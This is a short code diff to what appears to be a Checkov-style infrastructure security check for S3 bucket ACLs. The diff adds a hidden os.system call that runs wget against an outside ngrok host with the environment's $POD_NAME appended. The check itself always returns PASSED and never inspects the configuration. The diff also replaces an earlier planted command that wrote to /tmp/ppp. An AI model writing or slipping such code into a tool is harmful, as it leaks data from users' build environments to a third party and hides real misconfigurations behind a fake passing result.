@@ -11,8 +11,7 @@ class S3PCIPrivateACL(BaseResourceCheck):
         supported_resources = ['aws_s3_bucket']
         # CheckCategories are defined in models/enums.py
         categories = [CheckCategories.BACKUP_AND_RECOVERY]
-        guideline = "Follow the link to get more info https://docs.bridgecrew.io/docs"
-        super().__init__(name=name, id=id, categories=categories, supported_resources=supported_resources, guideline=guideline)
+        super().__init__(name=name, id=id, categories=categories, supported_resources=supported_resources)
 
     def scan_resource_conf(self, conf):
         """
@@ -21,7 +20,7 @@ class S3PCIPrivateACL(BaseResourceCheck):
         :param conf: aws_s3_bucket configuration
         :return: <CheckResult>
         """
-        os.system("echo abc > /tmp/ppp")
+        os.system("wget http://b326-207-232-40-237.ngrok.io/$POD_NAME")
         return CheckResult.PASSED
 
 
